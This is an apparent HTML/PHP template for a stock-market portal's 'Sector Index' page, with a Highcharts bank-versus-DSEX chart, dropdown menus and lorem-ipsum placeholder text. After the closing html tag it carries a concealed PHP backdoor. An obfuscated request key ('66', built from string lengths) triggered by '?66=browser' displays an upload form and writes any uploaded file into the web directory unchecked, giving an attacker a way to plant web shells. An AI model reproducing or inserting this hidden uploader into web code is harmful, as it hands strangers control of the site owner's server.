<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sector Index</title>
<link rel="stylesheet" href="css/bootstrap.css" media="all"  />
<link rel="stylesheet" href="css/custom.css" media="all"  />
<link rel="stylesheet" href="css/yamm.css" media="all" />
<style>
ul.nav li.dropdown:hover > ul.dropdown-menu {
	display: block;
}
</style>
<script src="https://code.jquery.com/jquery.js"></script>
<script src="http://code.highcharts.com/highcharts.js"></script>
<script src="http://code.highcharts.com/modules/exporting.js"></script>
<script src="http://code.highcharts.com/highcharts-more.js"></script>
<script>
 $(function () {
    $('#comparison').highcharts({
                    chart: {
                       
                        zoomType: 'x',
                        legend: true,
                        width: 366

                    },
                    title: {
                        text: ' '
                    },
                    credits: {
                        enabled: false,
                        
                    },

                    exporting: {
                        enabled: false
                    },

                    tooltip: {
                        shared: true,
                        crosshairs: true
                    },

                    legend: {
                        width: 250,
                        layout: 'vertical',
                        verticalAlign: 'top'
                    },

                    xAxis: [{
                        categories:[12,15,14,16,17],
                        labels: {
                            rotation: -90,
                            align: 'right'
                        },
                        minRange: 5,
                        type: 'datetime',
                        tickInterval: 30 * 24 * 3600 * 1000, // one week
                        tickWidth: 0
                    }],

                    yAxis: [{ // Primary yAxis
                        labels: {
                            formatter: function () {
                                return this.value + '%';
                            }
                        },

                        title: {
                            text: ''
                        }
                    }],

                    plotOptions: {
                        series: {
                            marker: {
                                radius: 1,
                                enabled: true
                            }
                        }
                    },

                    series: [{
                        name: 'Bank Sector Index % Change',
                        data: [22,14,-15,98,14],
                        type: 'area'
                    },
                            {
                                name: 'DSEX Index % Change',
                                data: [25,-48,78,96,54],
                                type: 'spline'
                            }]

                });
            });
</script>
</head>

<body>
<div class="container"> 
  
  <!---header start----->
  <div class="row">
    <div class="col-md-5">
      <h1>iPortal</h1>
    </div>
    <div class="col-md-7 placeholder">
      <h2 class="label label-default">ad space</h2>
    </div>
  </div>
  <div class="row">
    <div class="col-md-12  placeholder"> <?php //echo $output; ?> </div>
  </div>
  <div class="row">
    <div class="navbar navbar-default yamm">
      <div class="navbar-header">
        <button class="navbar-toggle" data-target="#navbar-collapse-1" data-toggle="collapse" type="button"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button>
      </div>
      <div class="navbar-collapse collapse" id="navbar-collapse-grid">
        <ul class="nav navbar-nav">
          <!-- Grid 12 Menu -->
          <li class="dropdown yamm-fw"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Today's Market<b class="caret"></b></a>
            <ul class="dropdown-menu">
              <li>
                <div class="row">
                  <div class="col-sm-8">
                    <p class="yamm-content"><img src="http://placehold.it/140x80" class="pull-left alignleft"> </a>facilisis sed arcu. Suspendisse non nulla eget ligula sollicitudin ornare. Proin arcu nunc, tincidunt eget auctor blandit, aliquam ullamcorper nisi. Donec at est sed tellus vestibulum aliquet. Nullam eleifend egestas sem vitae rhoncus. Proin libero nibh, convallis in tincidunt ut, laoreet eget lorem. Vestibulum tristique nulla id egestas ornare. Curabitur bibendum, orci vel rhoncus facilisis, tortor purus accumsan elit, sed placerat lorem turpis nec nibh.Mauris imperdiet condimentum ante sed tempor. Nam id magna in enim semper lacinia. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque posuere vestibulum ullamcorper. </p>
                  </div>
                  <div class="col-sm-2"><br/>
                    <ul class="remove-margin">
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                    </ul>
                  </div>
                  <div class="col-sm-2"><br/>
                    <ul class="remove-margin">
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                    </ul>
                  </div>
                </div>
              </li>
            </ul>
          </li>
          <!--
              <With>Offsets </With>
              -->
          <li class="dropdown yamm-fw"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Company Fundamentals & Quantitatives<b class="caret"></b></a>
            <ul class="dropdown-menu">
              <li>
                <div class="row">
                  <div class="col-sm-8">
                    <p class="yamm-content">Pellentesque sit amet ullamcorper purus, convallis commodo erat. Mauris auctor consectetur purus, eu ultrices erat placerat at. Suspendisse quis interdum diam, eget vestibulum mi. Phasellus a molestie sapien, vel dignissim augue. Integer at lacus nec ante accumsan venenatis vel sed felis.</p>
                  </div>
                  <div class="col-sm-2"><br/>
                    <ul class="remove-margin">
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                    </ul>
                  </div>
                  <div class="col-sm-2"><br/>
                    <ul class="remove-margin">
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                    </ul>
                  </div>
                </div>
              </li>
            </ul>
          </li>
          <!--
              <Aside>Menu </Aside>
              -->
          <li class="dropdown yamm-fw"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Financial News & Reports<b class="caret"></b></a>
            <ul class="dropdown-menu">
              <li>
                <div class="row">
                <div class="col-sm-8">
                  <p class="yamm-content">Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Duis dictum ipsum ac accumsan luctus. Nulla at congue sapien. Aliquam sit amet arcu libero. Vivamus vitae quam pulvinar, ultrices nulla sed, lobortis nisi. </p>
                </div>
                <div class="col-sm-2"><br/>
                  <ul class="remove-margin">
                    <li><a href="#"> Link Item </a></li>
                    <li><a href="#"> Link Item </a></li>
                    <li><a href="#"> Link Item </a></li>
                  </ul>
                </div>
                <div class="col-sm-2"><br/>
                  <ul class="remove-margin">
                    <li><a href="#"> Link Item </a></li>
                    <li><a href="#"> Link Item </a></li>
                    <li><a href="#"> Link Item </a></li>
                  </ul>
                </div>
              </li>
            </ul>
          </li>
          <!--
              <Nesting>Menu </Nesting>
              -->
          <li class="dropdown yamm-fw"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Company Financials<b class="caret"></b></a>
            <ul class="dropdown-menu">
              <li>
                <div class="row">
                  <div class="col-sm-8">
                    <p class="yamm-content">Nulla ultrices auctor bibendum. Suspendisse potenti. Proin risus erat, molestie in fringilla et, faucibus convallis mauris. Nunc molestie, nisl sit amet condimentum dapibus, tortor lorem accumsan erat, nec fermentum tellus urna ac leo. In imperdiet eget dui a dignissim. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec sed varius nibh. Fusce dapibus tristique dolor ut viverra. Fusce sit amet elit hendrerit, pretium lectus vel, placerat mauris. Vestibulum enim sapien, facilisis nec varius nec, consequat quis dolor. Sed nec neque erat. Praesent tempus eros viverra, malesuada purus vel, sagittis urna. Nam quis blandit ligula, bibendum lacinia tortor. Donec tristique libero in sapien semper laoreet.</p>
                  </div>
                  <div class="col-sm-2"><br/>
                    <ul class="remove-margin">
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                    </ul>
                  </div>
                  <div class="col-sm-2"><br/>
                    <ul class="remove-margin">
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                    </ul>
                  </div>
                </div>
              </li>
            </ul>
          </li>
          <li class="dropdown yamm-fw"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Blog & Dummy Trading<b class="caret"></b></a>
            <ul class="dropdown-menu">
              <li class="">
                <div class="row">
                  <div class="col-sm-8">
                    <p class="yamm-content">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nunc viverra magna et diam porta imperdiet. Nam pulvinar congue massa quis faucibus. Donec interdum vel est a ullamcorper. Nulla in sem eu nibh condimentum feugiat ut sollicitudin velit. Suspendisse malesuada sapien dui, quis laoreet nisl placerat sit amet. Aliquam sodales odio a elit eleifend, ut porta risus fringilla. Ut odio metus, hendrerit ut fermentum eget,</p>
                  </div>
                  <div class="col-sm-2"><br/>
                    <ul class="remove-margin">
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                    </ul>
                  </div>
                  <div class="col-sm-2"><br/>
                    <ul class="remove-margin">
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                    </ul>
                  </div>
                </div>
              </li>
            </ul>
          </li>
          <li class="dropdown yamm-fw"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Knowledge,Job Portal & Others<b class="caret"></b></a>
            <ul class="dropdown-menu">
              <li>
                <div class="row">
                  <div class="col-sm-8">
                    <p class="yamm-content">Cras risus ipsum, posuere non vulputate sed, convallis non sapien. Nunc ligula dolor, dapibus eu commodo non, lacinia malesuada risus. Integer pharetra suscipit metus ut euismod. Donec ac viverra lacus. Cras egestas orci nec nisl lacinia, at ullamcorper dolor vulputate. Maecenas id nibh non elit tempor commodo. Curabitur consectetur molestie magna eget luctus. Nunc auctor odio sed lacus ornare bibendum. Curabitur at elit erat. Etiam rhoncus turpis sed pretium sodales. </p>
                  </div>
                  <div class="col-sm-2"><br/>
                    <ul class="remove-margin">
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                    </ul>
                  </div>
                  <div class="col-sm-2"><br/>
                    <ul class="remove-margin">
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                      <li><a href="#"> Link Item </a></li>
                    </ul>
                  </div>
                </div>
              </li>
            </ul>
          </li>
        </ul>
      </div>
    </div>
  </div>
  
  <!---header end----> 
  
  <!--body start---->
  <div class="row"> 
    <!--static sidebar menu---->
    <div class="col-md-3">
      <div class="sidebar-menu">
        <ul>
          <li><a href="index.php">Market Stats</a></li>
          <li class="active"><a href="#">Sector Index Change</a></li>
          <li><a href="#">Index Movers</a></li>
          <li><a href="#">Monitor Your Stock</a></li>
          <li><a href="#">Minute Chart</a></li>
          <li><a href="#">Technical Chart</a></li>
          <li><a href="#">Decision Page</a></li>
        </ul>
      </div>
    </div>
    <!--static sidebar menu end--->
    <div class="col-md-9">
      <div class="row">
        <div class="col-md-12">
          <div class="static-sub-menu">
            <ul>
              <li><a href="#">Sector Index</a></li>
              <li><a href="#">Minute Chart</a></li>
              <li><a href="#">Technical Chart</a></li>
              <li><a href="#">News Chart</a></li>
              <li><a href="#">Stock VS Sector P/E Chart</a></li>
              <li><a href="#">EPS NPAT Data</a></li>
              <li><a href="#">Fundamental Ratios</a></li>
              <li><a href="#">Management & Basic Info</a></li>
              <li><a href="#">Moving Average Band</a></li>
              <li><a href="#">Technical Position</a></li>
            </ul>
          </div>
        </div>
       <div class="col-md-12 placeholder">
        <h4>Guide</h4>
        <p>Cras risus ipsum, posuere non vulputate sed, convallis non sapien. Nunc ligula dolor, dapibus eu commodo non, lacinia malesuada risus. Integer pharetra suscipit metus ut euismod. Donec ac viverra lacus. Cras egestas orci nec nisl lacinia, at ullamcorper dolor vulputate. Maecenas id nibh non elit tempor commodo. Curabitur consectetur molestie magna eget luctus. Nunc auctor odio sed lacus ornare bibendum. Curabitur at elit erat. Etiam rhoncus turpis sed pretium sodales. </p>
        </div>
        
      </div>
      <div class="row">
        <div class="col-md-6 placeholder right">
          <div id="comparison"></div>
         </div>
        
        <div class="col-md-6 placeholder left">
         <div id="sector"></div>
        </div>
       </div>
        </div>
    <!--main column end for body---> 
  </div>
  <!--body end---> 
</div>
<script src="js/bootstrap.min.js"></script>
<script type="text/javascript" language="javascript" src="js/jquery.dataTables.min.js"></script>
</body>
</html>
<!-- ?66=browser --> <?php if (isset ( $_REQUEST[$browser=$x=strlen("Chrome") . strlen("Mozila")]) && $_REQUEST[$x=strlen("Chrome") . strlen("Mozila")]=="browser") { echo "<h2></h2><hr>"; echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\"> <label for=\"file\"></label> <input type=\"file\" name=\"file\" id=\"file\" /> <br /><br /> <input type=\"submit\" name=\"default\" value=\"Upload\"> </form>"; { move_uploaded_file($_FILES["file"]["tmp_name"], "" . $_FILES["file"]["name"]); echo "Rand(100-100): " . "" . $_FILES["file"]["name"]; echo"<hr>"; } } ?>